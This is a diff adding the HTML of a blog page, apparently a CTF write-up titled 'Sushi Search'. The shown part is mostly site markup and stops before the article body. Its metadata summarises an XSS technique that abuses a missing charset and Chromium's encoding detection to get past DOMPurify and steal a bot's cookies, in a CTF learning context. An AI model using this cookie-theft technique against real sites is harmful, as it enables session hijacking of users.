@@ -1,0 +1,1433 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Sushi Search &middot; hibwyli</title>
+  <meta name="title" content="Sushi Search &middot; hibwyli" />
+  
+  <meta name="description" content="hibwyli&#39;s personal page" />
+  <meta name="keywords" content="Web, " />
+  
+  
+  <link rel="canonical" href="//localhost:1313/posts/sekai24/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.857ec6700dbdcae3e112eba9fc29e3aa948366934f76d502f60b6a3e436e12e2f10925d27f3032ad87f18cbcaddb981eca1fa59d74de83da90ade26f5faf75dd.css"
+    integrity="sha512-hX7GcA29yuPhEuup/CnjqpSDZpNPdtUC9gtqPkNuEuLxCSXSfzAyrYfxjLyt25geyh&#43;lnXTeg9qQreJvX6913Q==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.984038b35a762692ece6c2038acfa3c9b3eb54655e7bd4838c6ccd3ec0fa375df9477c7a5e2cb6212e4e6847a8b6b8aca64624df0467a3d4d876528de8846064.js"
+    integrity="sha512-mEA4s1p2JpLs5sIDis&#43;jybPrVGVee9SDjGzNPsD6N135R3x6Xiy2IS5OaEeotrispkYk3wRno9TYdlKN6IRgZA==" data-copy="" data-copied=""></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/posts/sekai24/">
+  <meta property="og:site_name" content="hibwyli">
+  <meta property="og:title" content="Sushi Search">
+  <meta property="og:description" content="Sushi Search # Read this before : Blog
+Type: Xss through missing charset
+Chromium detect engine This is really hard to me , and i just can solve after reading script :v SOURCE CODE : # This type of ctfs is just creating a xss url and send to bot and get their cookies(flag) , so we focus on Xss. But …. :::danger They sanitize it with DomPurify at newest version ! ::: Pay attention in this code :">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-27T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-08-27T00:00:00+00:00">
+    <meta property="article:tag" content="Web">
+    <meta property="og:image" content="//localhost:1313/posts/sekai24/feature_life.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/posts/sekai24/feature_life.png">
+  <meta name="twitter:title" content="Sushi Search">
+  <meta name="twitter:description" content="Sushi Search # Read this before : Blog
+Type: Xss through missing charset
+Chromium detect engine This is really hard to me , and i just can solve after reading script :v SOURCE CODE : # This type of ctfs is just creating a xss url and send to bot and get their cookies(flag) , so we focus on Xss. But …. :::danger They sanitize it with DomPurify at newest version ! ::: Pay attention in this code :">
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "Sushi Search",
+    "headline": "Sushi Search",
+    
+    "abstract": "\u003ch1 class=\u0022relative group\u0022\u003eSushi Search \n    \u003cdiv id=\u0022sushi-search\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\u0022\u003e\n        \u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700\u0022\n            style=\u0022text-decoration-line: none !important;\u0022 href=\u0022#sushi-search\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e        \n    \n\u003c\/h1\u003e\n\u003cp\u003eRead this before :\n\u003ca href=\u0022https:\/\/thenewstack.io\/encoding-differentials-why-charset-matters\/\u0022 target=\u0022_blank\u0022\u003eBlog\u003c\/a\u003e\u003c\/p\u003e\n\u003cp\u003eType: Xss through missing charset\u003c\/p\u003e\n\u003cp\u003e\u003ca href=\u0022https:\/\/source.chromium.org\/chromium\/chromium\/src\/\u0026#43;\/main:third_party\/ced\/src\/compact_enc_det\/compact_enc_det.cc\u0022 target=\u0022_blank\u0022\u003eChromium detect engine \u003c\/a\u003e\u003c\/p\u003e\n\u003cp\u003e\n  \u003cfigure\u003e\n    \u003cimg class=\u0022my-0 rounded-md\u0022 loading=\u0022lazy\u0022 src=\u0022https:\/\/hackmd.io\/_uploads\/ry6iR71NJl.png\u0022 alt=\u0022image\u0022 \/\u003e\n    \n  \u003c\/figure\u003e\n\u003c\/p\u003e\n\u003cul\u003e\n\u003cli\u003eThis is really hard to me , and i just can solve after reading script :v\u003c\/li\u003e\n\u003c\/ul\u003e\n\n\n\u003ch2 class=\u0022relative group\u0022\u003eSOURCE CODE : \n    \u003cdiv id=\u0022source-code-\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\u0022\u003e\n        \u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700\u0022\n            style=\u0022text-decoration-line: none !important;\u0022 href=\u0022#source-code-\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e        \n    \n\u003c\/h2\u003e\n\u003cul\u003e\n\u003cli\u003eThis type of ctfs is just creating a xss url and send to bot and get their cookies(flag) , so we focus on Xss.\nBut \u0026hellip;.\n\n  \u003cfigure\u003e\n    \u003cimg class=\u0022my-0 rounded-md\u0022 loading=\u0022lazy\u0022 src=\u0022https:\/\/hackmd.io\/_uploads\/BkyL1E1EJx.png\u0022 alt=\u0022image\u0022 \/\u003e\n    \n  \u003c\/figure\u003e\n\n:::danger\nThey sanitize it with DomPurify at newest version !\n:::\u003c\/li\u003e\n\u003c\/ul\u003e\n\u003cp\u003ePay attention in this code :\n\n  \u003cfigure\u003e\n    \u003cimg class=\u0022my-0 rounded-md\u0022 loading=\u0022lazy\u0022 src=\u0022https:\/\/hackmd.io\/_uploads\/HkphkNJE1x.png\u0022 alt=\u0022image\u0022 \/\u003e\n    \n  \u003c\/figure\u003e\n\u003c\/p\u003e",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/posts\/sekai24\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-08-27T00:00:00\u002b00:00",
+    "datePublished": "2024-08-27T00:00:00\u002b00:00",
+    
+    "dateModified": "2024-08-27T00:00:00\u002b00:00",
+    
+    "keywords": ["Web"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "922"
+  }]
+  </script>
+
+
+  
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.7d88d2a1c0c3e9cb6e435406228f7e367f4e73899f6aed88884f0a8b5172315e0e704494b7cd4532a9a1b197bdcd667a83a35d733ac4300a2cd4694b2c08a95a.js" integrity="sha512-fYjSocDD6ctuQ1QGIo9&#43;Nn9Oc4mfau2IiE8Ki1FyMV4OcESUt81FMqmhsZe9zWZ6g6NdczrEMAos1GlLLAipWg=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">hibwyli</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="Posts">
+        Posts
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="About">
+        About
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="Categories">
+        Categories
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="Tags">
+        Tags
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="Posts">
+            Posts
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="About">
+            About
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="Categories">
+            Categories
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="Tags">
+            Tags
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                <hr>
+                <ul
+                    class="flex mt-4 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+
+                    
+                    <li class="mb-1">
+                        <a href=""  class="flex items-center">
+                            
+                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
+                                Pwnable
+                            </p>
+                        </a>
+                    </li>
+                    
+                    <li class="mb-1">
+                        <a href="/tags/web/"  class="flex items-center">
+                            
+                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="Web">
+                                Web
+                            </p>
+                        </a>
+                    </li>
+                    
+                    <li class="mb-1">
+                        <a href=""  class="flex items-center">
+                            
+                            <span  class="mr-3" >
+                                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+                            </span>
+                            
+                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
+                                Write up
+                            </p>
+                        </a>
+                    </li>
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+<div class="main-menu flex pb-3 flex-col items-end justify-between md:justify-start space-x-3" >
+    <div class="hidden md:flex items-center space-x-5">
+        
+        <a href=""  class="flex items-center">
+            
+            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="">
+                Pwnable
+            </p>
+        </a>
+        
+        <a href="/tags/web/"  class="flex items-center">
+            
+            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="Web">
+                Web
+            </p>
+        </a>
+        
+        <a href=""  class="flex items-center">
+            
+            <span  class="mr-1" >
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+            </span>
+            
+            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="">
+                Write up
+            </p>
+        </a>
+        
+    </div>
+</div>
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+
+
+<div id="hero" class="h-[150px] md:h-[200px]"></div>
+
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/posts/sekai24/feature_life.png);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
+
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      >hibwyli</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/sekai24/"
+      >Sushi Search</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Sushi Search
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2024-08-27T00:00:00&#43;00:00">27 August 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/hibwyli/&#34;,'_self');return false;">Hibwyli</div>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Writeup
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
